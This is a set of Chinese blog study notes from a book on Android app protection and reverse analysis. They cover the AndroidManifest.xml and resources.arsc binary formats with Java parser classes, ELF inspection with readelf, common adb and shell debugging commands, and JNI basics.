基础篇⑤-⑥ 这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。\n第五章 AndroidManifest.xml格式解析 AndroidManifest.xml\nAndroidManifest.xml文件格式图\n头部信息 文件魔数：4bytes。\n文件大小：4bytes。\nChunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。\nSting Chunk ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。\nChunkType：类型，固定4bytes（0x001C001)。\nChunkSize：大小，4bytes。\nStringCount：字符串的个数 ，4bytes。\nStyleCount ：样式的个数，4bytes。\nUnknown ：位置区域。4bytes。\nStringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。\nStylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。\nStringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。\nStyleOffsets：每个样式的偏移值，大小为StyleChunk*4。\n如何读取这个文件？\nResourceld Chunk ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID\nChunkType：类型，固定4bytes（0x00080108）。\nChunkSize：大小，4bytes。\nResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。\n解析？\nStart Namespace Chunk：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。\nChunk Type：类型，固定4bytes。（0x00100100)。\nChunk Size：大小，4bytes。\nLine Number ：AndroidMaifest文件中行号，4bytes。\nUnknown：未知区域,4bytes。\nPrefix：命名空间的前缀（在字符串中的索引值），eg:android。\nUri：命名空间的URI（在字符串中的索引值），eg:http://schemas.android.com/apk/res/android\nStart Tag Chunk：AndroidMaifest.xml的标签信息，最核心的内容，也是最复杂的内容。\nChunk Type：类型，固定4bytes。（0x00100102)。\nChunk Size：大小，4bytes。\nLine Number ：对应AndroidMaifest中的行号，4bytes。\nUnknown：未知区域,4bytes。\nNamespace Uri ：命名空间的Uri，4bytes。\nName：标签名称（在字符串中的索引值），4bytes。\nFlags：标签的类型，4bytes。eg：是开始标签还是结束标签？\nAttributes Counk：便签中包含的属性的个数，4bytes。\nClass Attribute：标签包含的类属性，4bytes。\nAttributes ：属性内容，每个属性算是一个Entry，Entry是一个大小5的字节数组[Namespace,URI,Name,ValueString,Data]，大小为”属性个数* 5 *4\u0026quot;个字节。\nAXMLPrinter工具 aapt 工具 第六章 resourec.arsc文件格式解析 资源文件id格式 resourec.arsc文件格式\n数据结构 上图\n头部信息\nresourec.arsc文件格式由一系列chunk组成，每一个chunk均包含一个ResChunk_header\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class ResChunkHeader{ public short type; //当前chunk的类型 public short headerSize; //当前chunk的头部大小 public int size; //当前chunk的大小 public int getHeaderSize(){ return 2+2+4 } @Override public String toString(){ return \u0026#34;type:\u0026#34;+Utils.bytesToHexString( Utils.int2Byte(type))+\u0026#34;,headerSize:\u0026#34;+headerSize+\u0026#34;,size:\u0026#34;+size; } } 资源索引表的头部信息\nresourec.arsc的第一个结构，结构描述了Resource.arsc文件的大小和资源包数量：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class ResTableHeader { public ResChunkHeader header; //就是标准的Chunk头部信息格式 public int packageCount; //被编译的资源包的个数 public ResTableHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;packageCount:\u0026#34;+packageCount; } } 资源项的值字符串资源池接着头部的的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值，而每一个元素的类型都是无符号整型。整个字符中资源池结构如下。\n包含了所有在资源包里面定义的资源项的值字符串，结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class ResStringPoolHeader { public ResChunkHeader header; //标准的Chunk头部信息结构 public int stringCount; //字符串的个数 public int styleCount; //字符串样式的个数 public final static int SORTED_FLAG = 1; public final static int UTF8_FLAG = (1\u0026lt;\u0026lt;8); public int flags; //字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值 public int stringsStart; //字符串内容块相对于其头部的距离 public int stylesStart; //字符串样式块相对于其头部的距离 public ResStringPoolHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4 + 4 + 4 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;stringCount:\u0026#34;+stringCount+\u0026#34;,styleCount:\u0026#34;+styleCount+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,stringStart:\u0026#34;+stringsStart+\u0026#34;,stylesStart:\u0026#34;+stylesStart; } } 字符串资源池中的字符串前两个字节为字符串长度,长度计算方法如下：\nlen = (((hbyte \u0026amp; 0x7F) \u0026lt;\u0026lt; 8)) | lbyte;\n如果字符串编码格式为UTF-8则字符串以0X00作为结束符,UTF-16则以0X0000作为结束符。\nPackage数据块\n这个数据块记录编译包的元数据，头部信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTablePackage { public ResChunkHeader header; //Chunk的头部信息数据结构 public int id; //包的ID,等于Package Id,一般用户包的值Package Id为0X7F,系统资源包的Package Id为0X01； public char[] name = new char[128]; //包名 public int typeStrings; //类型字符串资源池相对头部的偏移 public int lastPublicType; //最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。在解析的过程中没发现他的用途 public int keyStrings; //资源项名称字符串相对头部的偏移 public int lastPublicKey; // 最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，目前这个值设置为资源项名称字符串资源池的元素个数。在解析的过程中没发现他的用途 public ResTablePackage(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34;+\u0026#34;,id=\u0026#34;+id+\u0026#34;,name:\u0026#34;+name.toString()+\u0026#34;,typeStrings:\u0026#34;+typeStrings+\u0026#34;,lastPublicType:\u0026#34;+lastPublicType+\u0026#34;,keyStrings:\u0026#34;+keyStrings+\u0026#34;,lastPublicKey:\u0026#34;+lastPublicKey; } } 类型规范数据块\n用来描述资源项的配置差异性。每一种类型都对应有一个类型规范数据块。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableTypeSpec { public final static int SPEC_PUBLIC = 0x40000000; public ResChunkHeader header; //Chunk的头部信息结构 public byte id; //标识资源的Type ID,Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。 public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public ResTableTypeSpec(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount; } } 资源类型项数据块\n描述资源项的具体信息，名称、值、配置等信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class ResTableType { public ResChunkHeader header; //Chunk的头部信息结构 public final static int NO_ENTRY = 0xFFFFFFFF; public byte id; //标识资源的Type ID public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public int entriesStart; //等于资源项数据块相对头部的偏移值。 public ResTableConfig resConfig; //指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等 public ResTableType(){ header = new ResChunkHeader(); resConfig = new ResTableConfig(); } public int getSize(){ return header.getHeaderSize() + 1 + 1 + 2 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount+\u0026#34;,entriesStart:\u0026#34;+entriesStart; } } ResTable_type后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用来描述一个资源项数据块的偏移位置。 紧跟在这个偏移数组后面的是一个大小为entryCount的ResTable_entry数组,每一个数组元素都用来描述一个资源项的具体信息。ResTable_entry的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class ResTableEntry { public final static int FLAG_COMPLEX = 0x0001; public final static int FLAG_PUBLIC = 0x0002; public short size; public short flags; public ResStringPoolRef key; public ResTableEntry(){ key = new ResStringPoolRef(); } public int getSize(){ return 2+2+key.getSize(); } @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,key:\u0026#34;+key.toString()+\u0026#34;,str:\u0026#34;+ParseResourceUtils.getKeyString(key.index); } } ResTable_entry根据flags的不同,后面跟随的数据也不相同,如果flags此位为1,则ResTable_entry是ResTable_map_entry,ResTable_map_entry继承自ResTable_entry,其结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableMapEntry extends ResTableEntry{ public ResTableRef parent; public int count; public ResTableMapEntry(){ parent = new ResTableRef(); } @Override public int getSize(){ return super.getSize() + parent.getSize() + 4; } @Override public String toString(){ return super.toString() + \u0026#34;,parent:\u0026#34;+parent.toString()+\u0026#34;,count:\u0026#34;+count; } } ResTable_map_entry其后跟随则count个ResTable_map类型的数组,ResTable_map的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.wjdiankong.parseresource.type; /** struct ResTable_map { //bag资源项ID ResTable_ref name; //bag资源项值 Res_value value; }; * @author i * */ public class ResTableMap { public ResTableRef name; public ResValue value; public ResTableMap(){ name = new ResTableRef(); value = new ResValue(); } public int getSize(){ return name.getSize() + value.getSize(); } @Override public String toString(){ return name.toString()+\u0026#34;,value:\u0026#34;+value.toString(); } } 如果flags此位为0,则ResTable_entry其后跟随的是一个Res_value,描述一个普通资源的值,Res_value结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 public class ResValue { //dataType字段使用的常量 public final static int TYPE_NULL = 0x00; public final static int TYPE_REFERENCE = 0x01; public final static int TYPE_ATTRIBUTE = 0x02; public final static int TYPE_STRING = 0x03; public final static int TYPE_FLOAT = 0x04; public final static int TYPE_DIMENSION = 0x05; public final static int TYPE_FRACTION = 0x06; public final static int TYPE_FIRST_INT = 0x10; public final static int TYPE_INT_DEC = 0x10; public final static int TYPE_INT_HEX = 0x11; public final static int TYPE_INT_BOOLEAN = 0x12; public final static int TYPE_FIRST_COLOR_INT = 0x1c; public final static int TYPE_INT_COLOR_ARGB8 = 0x1c; public final static int TYPE_INT_COLOR_RGB8 = 0x1d; public final static int TYPE_INT_COLOR_ARGB4 = 0x1e; public final static int TYPE_INT_COLOR_RGB4 = 0x1f; public final static int TYPE_LAST_COLOR_INT = 0x1f; public final static int TYPE_LAST_INT = 0x1f; public static final int COMPLEX_UNIT_PX\t=0, COMPLEX_UNIT_DIP\t=1, COMPLEX_UNIT_SP\t=2, COMPLEX_UNIT_PT\t=3, COMPLEX_UNIT_IN\t=4, COMPLEX_UNIT_MM\t=5, COMPLEX_UNIT_SHIFT\t=0, COMPLEX_UNIT_MASK\t=15, COMPLEX_UNIT_FRACTION\t=0, COMPLEX_UNIT_FRACTION_PARENT=1, COMPLEX_RADIX_23p0\t=0, COMPLEX_RADIX_16p7\t=1, COMPLEX_RADIX_8p15\t=2, COMPLEX_RADIX_0p23\t=3, COMPLEX_RADIX_SHIFT\t=4, COMPLEX_RADIX_MASK\t=3, COMPLEX_MANTISSA_SHIFT\t=8, COMPLEX_MANTISSA_MASK\t=0xFFFFFF; public short size; //ResValue的头部大小 public byte res0; //保留，始终为0 public byte dataType; //数据的类型,可以从上面的枚举类型中获取 public int data; //数据对应的索引 public int getSize(){ return 2 + 1 + 1 + 4; } public String getTypeStr(){ switch(dataType){ case TYPE_NULL: return \u0026#34;TYPE_NULL\u0026#34;; case TYPE_REFERENCE: return \u0026#34;TYPE_REFERENCE\u0026#34;; case TYPE_ATTRIBUTE: return \u0026#34;TYPE_ATTRIBUTE\u0026#34;; case TYPE_STRING: return \u0026#34;TYPE_STRING\u0026#34;; case TYPE_FLOAT: return \u0026#34;TYPE_FLOAT\u0026#34;; case TYPE_DIMENSION: return \u0026#34;TYPE_DIMENSION\u0026#34;; case TYPE_FRACTION: return \u0026#34;TYPE_FRACTION\u0026#34;; case TYPE_FIRST_INT: return \u0026#34;TYPE_FIRST_INT\u0026#34;; case TYPE_INT_HEX: return \u0026#34;TYPE_INT_HEX\u0026#34;; case TYPE_INT_BOOLEAN: return \u0026#34;TYPE_INT_BOOLEAN\u0026#34;; case TYPE_FIRST_COLOR_INT: return \u0026#34;TYPE_FIRST_COLOR_INT\u0026#34;; case TYPE_INT_COLOR_RGB8: return \u0026#34;TYPE_INT_COLOR_RGB8\u0026#34;; case TYPE_INT_COLOR_ARGB4: return \u0026#34;TYPE_INT_COLOR_ARGB4\u0026#34;; case TYPE_INT_COLOR_RGB4: return \u0026#34;TYPE_INT_COLOR_RGB4\u0026#34;; } return \u0026#34;\u0026#34;; } /*public String getDataStr(){ if(dataType == TYPE_STRING){ return ParseResourceUtils.getResString(data); }else if(dataType == TYPE_FIRST_COLOR_INT){ return Utils.bytesToHexString(Utils.int2Byte(data)); }else if(dataType == TYPE_INT_BOOLEAN){ return data==0 ? \u0026#34;false\u0026#34; : \u0026#34;true\u0026#34;; } return data+\u0026#34;\u0026#34;; }*/ public String getDataStr() { if (dataType == TYPE_STRING) { return ParseResourceUtils.getResString(data); } if (dataType == TYPE_ATTRIBUTE) { return String.format(\u0026#34;?%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_REFERENCE) { return String.format(\u0026#34;@%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_FLOAT) { return String.valueOf(Float.intBitsToFloat(data)); } if (dataType == TYPE_INT_HEX) { return String.format(\u0026#34;0x%08X\u0026#34;,data); } if (dataType == TYPE_INT_BOOLEAN) { return data!=0?\u0026#34;true\u0026#34;:\u0026#34;false\u0026#34;; } if (dataType == TYPE_DIMENSION) { return Float.toString(complexToFloat(data))+ DIMENSION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType == TYPE_FRACTION) { return Float.toString(complexToFloat(data))+ FRACTION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType \u0026gt;= TYPE_FIRST_COLOR_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_COLOR_INT) { return String.format(\u0026#34;#%08X\u0026#34;,data); } if (dataType \u0026gt;= TYPE_FIRST_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_INT) { return String.valueOf(data); } return String.format(\u0026#34;\u0026lt;0x%X, type 0x%02X\u0026gt;\u0026#34;,data, dataType); } private static String getPackage(int id) { if (id\u0026gt;\u0026gt;\u0026gt;24==1) { return \u0026#34;android:\u0026#34;; } return \u0026#34;\u0026#34;; } public static float complexToFloat(int complex) { return (float)(complex \u0026amp; 0xFFFFFF00)*RADIX_MULTS[(complex\u0026gt;\u0026gt;4) \u0026amp; 3]; } private static final float RADIX_MULTS[]={ 0.00390625F,3.051758E-005F,1.192093E-007F,4.656613E-010F }; private static final String DIMENSION_UNITS[]={ \u0026#34;px\u0026#34;,\u0026#34;dip\u0026#34;,\u0026#34;sp\u0026#34;,\u0026#34;pt\u0026#34;,\u0026#34;in\u0026#34;,\u0026#34;mm\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; private static final String FRACTION_UNITS[]={ \u0026#34;%\u0026#34;,\u0026#34;%p\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,dataType:\u0026#34;+getTypeStr()+\u0026#34;,data:\u0026#34;+getDataStr(); } } 以上代码来自于书的原作者的博客：https://blog.csdn.net/jiangwei0910410003/article/details/50628894\n博客里还有如何解析操作，留看。\n总结 这两章讲的还是挺详细的，可以留着备用查阅，这两个文件都能加以混淆来保护应用，所以还是挺重要的。\n","date":"2018-08-29T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/","title":"Android应用安全防护和逆向分析-基础篇5-6"},{"content":"Android应用安全防护和逆向分析-基础篇4 一、 基础篇④ 第四章 so文件格式解析 ELF文件格式\nso文件-\u0026gt;elf文件，文件格式看图（引用自@非虫）：\n解析工具\nreadelf 常用命令\nreadelf -h xxx.so 查头部信息\nreadelf -S xxx.so 查节（Section）信息\nreadelf -l xxx.so 查段（Program）信息\nreadelf -a xxx.so 查全部信息\n解析ELF文件\n动手解析一个elf文件 。。。\n太水 这里的内容\n直接去看源码实现用java解析elf文件信息https://github.com/fourbrother/parse_androidso\nELF 相关内容还是单独详细分析 单独写一篇吧\nELF书籍《Linux二进制分析》\n总结 加固脱壳必须掌握的知识点。\n","date":"2018-08-22T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/","title":"Android应用安全防护和逆向分析-基础篇4"},{"content":"Android应用安全防护和逆向分析-基础篇3 一、 基础篇③ 第三章 Android中开发与逆向常用命令总结 1. 基础命令 1.1 cat命令 ​ 查看文件内容 结合grep进行过滤\n1.2 echo/touch命令 ​ 写文件 配个定向符使用\n2. 非shell命令 2.1 adb shell dumpsys sctivity top ​ 说明：查看当前应用的activity信息\n​ 用法：运行需要查看的应用\n​ 如果直接运行 adb shell dmpsys会把当前系统中的所有应用运行的四大组件都打印出来 内容非常多 使用信息重定向来进行选择：可借助Windows的start命令\n2.2 adb shell dumpsys package ​ 说明：查看指定包名应用的详细信息 （相当于AndroidManifest.xml的内容）\n​ 用法：adb shell dumpsys package [pkgname]\n2.3 adb shell dumpsys meminfo ​ 说明：查看指定进程名或者进程id的内存信息\n​ 用法：adb shell dumpsys meminfo [pname/pid]\n​ 和后面的top命令结合使用 可以分析应用的性能消耗情况\n2.4 adb shell dump dbnfo ​ 说明：查看指定包名应用的数据库存储信息（包括存储的SQL语句）\n​ 用法：adb shell dump dbnfo [packagename]\n2.5 adb install ​ 说明：安装应用包apk文件\n​ 用法：adb install [apk文件]\n​ 升级安装 使用apk install -r [apk文件]\n2.6 adb uninstall ​ 卸载\n2.7 adb pull ​ 从设备复制到本地\n​ adb pull 设备目录 本地目录\n2.8 adb push ​ 从本地复制到设备\n​ 同上\n2.9 adb shell screencap ​ 截屏\n​ adb shell scteencap -p 截图文件目录\n​ 快速截取手机屏幕\n1 2 3 adb shell screencap -p /sdcard/tmp.png adb pull /sdcard/tmp.png D:\\ start D:\\tmp.png 2.10 adb shell screenrecord ​ 录屏\n​ adb shell screenrecord 路径\n2.11 adb shell input text ​ 输入文本内容\n​ adb shell input text [需要输入文本框的内容]\n​ eg: 让输入内容的文本框回去焦点\n​ adb shell input text 'hello world'\n​ 这个命令可以模拟物理键盘、虚拟键盘、滑动、滚动等事件。\n2.12 adb forward ​ 端口转发命令\n​ adb forward [远程协议：端口号]· [设备协议：端口号 ]\n​ eg: adb forward tcp:23946 tcp:23946 IDA 调试\n​ adb forwrd tcp:8700 jwdp:1786\n2.13 adb jdwp ​ 查看设备中可以被调试的应用的进程号\n​ adb jdwp\n2.14 adb logcat ​ 查看当前的日志信息\n​ adb logcat -s tag eg：adb logcat -s fb\n​ adb logcat | findstr pname/pip/keyword\n​ adb logcat | findstr 包\n​ 日志信息过滤\n3. shell 命令 这儿shell命令是指先运行adb shell 再执行命令 与非shell命令互通\n3.1 run-as ​ 在非root设备中查看指定debug模式的包名应用沙盒数据\n​ run-as [package name]\n3.2 ps ​ 查看设备进程信息或者指定进程的线程信息\n​ ps | grep 过滤内容\n​ ps -t [pid] 查看pid 对应的线程信息\n​\n3.3 pm clear ​ 清空指定包名的应用数据\n​ pm clear [packagename]\n3.4 pm install ​ 安装设备中的apk 同adb install\n3.5 pm uninstall ​ 卸载\n3.6 am start ​ 启动一个应用\n​ am start -n [packname]/[packname].[activity name]\n​ am start -D -n (以debug方式启动)\n3.7 am startservice ​ 启动一个服务\n​ am startservice -n [packagename]/[package name].[service name]\n3.8 am broadcast ​ 发送一个广播\n​ am broadcast -a [广播动作]\n3.9 netcfg ​ 查看设备的ip地址\n3.10 netstat ​ 查看设备的端口号信息\n3.11 app_process ​ 运行java代码\n​ app_process [运行代码目录]· [运行主类]\n​ eg:\n​ export CLASSPATH = /data/demo.jar\n​ exec /system/bin/app_process /data/cn.wdasdkl.Main\n3.12 dalvikvm ​ 运行dex文件\n​ dalvikvm -cp [dex文件] · [运行主类]\n​ 差不多同上的用处\n3.13 top ​ 查看当前应用CPU的消耗信息。\n​ top [-n/-m/-d/-s/-t]\n​ -m 最多显示多少个进程\n​ -n 刷新次数\n​ -d 刷新时间间隔\n​ -s 按那一列排序\n​ -t 显示线程信息而不是进程\n3.14 getprop ​ 查看系统属性\n​ getprop [属性值名称]\n​ eg：getprop ro.debuggable\n​ 查看设备的信息\n4 操作apk 命令 4.1 用aapt 命令操作apk命令 ​ 查看apk中的信息以及编辑apk程序包\n​ aapt dump xmltree [apk包] · [需要查看的资源文件]\n​ eg：aapt dump xmltree demp.apk AndroidManifest.xml\n4.2 用dexdump 操作dex 命令 ​ 查看dex的详细信息\n​ dexdump [dex文件路径]\n5 进程命令 1 ##### 5.1 查看当前进程的内存加载情况 ​ cat proc/[pid]/maps 查看当前进程的内存映射信息，比如加载了那些so文件，dex文件等等。\n5.2 查看进程的状态信息 ​ cat /proc/[pid]/status\n5.3 查看当前应用使用的端口号信息 ​ cat /proc /[pid] / net / tcp/ tcp6 /udp /udp6\n总结 ​ 这章就是一些会用到的命令，后面的学习必不可少的知识点。\n","date":"2018-08-16T02:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/","title":"Android应用安全防护和逆向分析-基础篇3"},{"content":"Android应用安全防护和逆向分析-基础篇2 一、 基础篇② 第二章 Android中NDK的开发 1. 相关环境 相关环境参考另外一篇文章Android安全和开发环境搭建\n2. JNI基础 2.1 第一行代码(书上使用Eclipse,我使用AS(简单方便很多)) ​ 参考文章Android安全和开发环境搭建中的JNI开发章节\n2.2 JNIEnv类型和jobject类型 AS 默认自动生成 1 public native String stringFromJNI(); 1 2 3 4 5 Java_com_naivete_jni_1study_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \u0026#34;Hello from C++\u0026#34;; return env-\u0026gt;NewStringUTF(hello.c_str()); JNIEnv类型\n通过JNIEnv* 指针就可以对Java端的代码进行操作\nJni的所有函数可以查看jni.h文件\n下面是一些函数eg：\nNewObject : 创建Java类中的对象。\nNewString : 创建Java类中的String对象。\nNewArray : 创建类型为Type的数组对象\nGetField: 获取型为Type的字段。\nSetFileld: 设置类型为Type的字段的值。\nGetStaticField: 获取类型为Type的static的字段。\nSetStaticField:设置类型为Typede的static的字段的值。\nCallMethod: 调用返回类型为Type的方法。\nCallStaticMethod: 调用返回值类型为Type的Static方法\n…..\nJobject参数obj\n如果native 方法不是static ,obj就代表native方法的实例。\n如果narive方法是static,obj 就代表native方法的类的class对象实例。\nJava和C++中的基本类型的映射关系：\n具体查看jni.h文件的详细说明\nJava类型 本地类型 JNI定义的别名 int long jint/jsize long _int64 jlong byte signed char jbyte boolean unsigned char jboolean char unsigned short jchar short short jshort float float jfloat double double jdouble Object _jobject* jobject jclass类型\njclass 表示java中的class 类：\nJNIEnv 类中有如下几个简单的函数可以取得jclass:\njclass FindClass( const char* clsName):通过类的名称来获取jclass\njcalss GetObjectClass( jobject obj ):通过对象实例来获取jcalss,相当于java 中的getclass方法\njclass GetSuperClass(jclass obj):通过jclass 可以获取其父类的jclass对象。\nnative中访问Java层代码\n常见的应用就是获取类的属性和调用类的方法\nJNi在jni.h头文件中定义了jfieldId、jmethodID类型分别代表JAVA端的属性和方法。\n使用JNI的以下方法来取得相应的jfieldId、jmethodID：\nGetFieldID、GetMethodID\nGetStaticFieldID、GetStaticMethodID\n查看jni.h中源函数\n1 GetFieldID(jclass clazz, const char* name, const char* sig) ​ 参数说明：\nclazz 方法依赖的类对象的class对象\nname: 字段的名称\nsig : 字段的签名\n查看签名命令\njavap -s -p 字节码.class 文件\nGetMethodID 也能够会的构造函数的jmethodID，创建一个Java对象是可以调用指定的构造方法，eg：\nenv-\u0026gt;GetmethodID(data_class,\u0026quot;\u0026lt;init\u0026gt;\u0026quot;,\u0026quot;()v\u0026quot;);\n签名的格式：\n类型 相应的签名 boolean Z byte B chat C short S int I long L float F double D void V object L用/分割包的完整类名；Ljava/lang/String; Array [签名 [I [Ljava/lang/Object Method (参数类型签名··· .) 返回值类型签名 eg:\n1 2 3 4 5 6 7 8 9 10 11 12 13 package com.naivete.jni_study; import java.util.Date; public class Hello { public int property; public int function(int foo, Date date,int[] arr){ System.out.println(\u0026#34;function\u0026#34;); return 0; } public native void test(); } 1 2 3 4 5 6 7 8 9 10 extern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_naivete_jni_1study_Hello_test(JNIEnv *env, jobject instance) { // TODO jclass helloclazz = env-\u0026gt;GetObjectClass(instance); jfieldID field_prop = env-\u0026gt;GetFieldID(helloclazz,\u0026#34;property\u0026#34;,\u0026#34;I\u0026#34;); //取到property字段 jmethodID method_fun = env-\u0026gt;GetMethodID(helloclazz,\u0026#34;function\u0026#34;,\u0026#34;ILjava/util/Date;[I)I\u0026#34;); //取到function函数 env-\u0026gt;CallIntMethod(instance,method_fun,0L,NULL,NULL); } GetStaticFieldID与GetStaticMethodID这两个方法的用法大同小异。\n2.3 JNIEnv类型中方法的使用 在java中定义一个属性，再从C++代码中将其设置成另外的值 2.3.1 native中获取方法的ID 1 2 3 4 5 6 7 8 9 10 11 private static String TAG = \u0026#34;Hello\u0026#34;; public int number = 0; public native void sayHello(); public static void main() { Hello hello = new Hello(); hello.sayHello(); System.out.print(hello.number); Log.d(TAG, \u0026#34;\u0026#34;+hello.number); } } 1 2 3 4 5 6 7 8 9 10 JNIEXPORT void JNICALL Java_com_naivete_jni_1study_Hello_sayHello(JNIEnv *env, jobject instance) { // TODO jclass helloclazz = env-\u0026gt;GetObjectClass(instance); jfieldID id_number = env-\u0026gt;GetFieldID(helloclazz,\u0026#34;number\u0026#34;,\u0026#34;I\u0026#34;); //获取numberID jint number = env-\u0026gt;GetIntField(instance,id_number); //获取number的值; cout\u0026lt;\u0026lt;number\u0026lt;\u0026lt;endl; //输出到控制台 env-\u0026gt;SetIntField(instance,id_number,100L); //设置number的值;注意jint对应c++ long类型 } JNIEnv 还提供了许多CallMethod 和CallStaticMethod 还有CallNovirtualMethod函数，需要通过GetMethodID来取得相应的方法的jmethodId传入到上述函数的参数中\n调用示例方法的三种形式如下：\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,·······); //常用的方式\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,va_list lst); //有指向参数表的va_list变量（很少使用）\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,jvalue * v); //有指向jvalue或jvalue数组指针时用的\njvalue 是union联合体，定义jvalue数组传递到方法中，这样可以包含多种类型的参数：\n1 2 3 4 5 6 7 8 9 10 11 typedef union jvalue{ jboolean z; jbytpe b; jchar c; jshort s; jint i; jlong j; jfloat f; jdouble d; jobject l; }jvalue; 比如在Java中有这样一个方法：\n1 2 3 4 5 boolean function(int a,double b,char c){ ····· } 1）在C++中使用第一种方法调用function方法：\nenv-\u0026gt;CallbooleanMethod(obj,id_function,10L，3.4，L'a')\nobj:functon对象，id_function:functiond的id,10L、3.4、L’a’是对应的参数。\nL’a’ 中的L是因为Java中的字符是Unicode双字节的，而C++中的字节是单字节的，所以要变成宽字符。\n2）在C++中使用第三种方法function调用：\n1 2 3 4 5 6 jvalue* args = new Jvalue[3] args[0] = 10L; args[1] = 3.22; args[2] = L\u0026#39;a\u0026#39;; 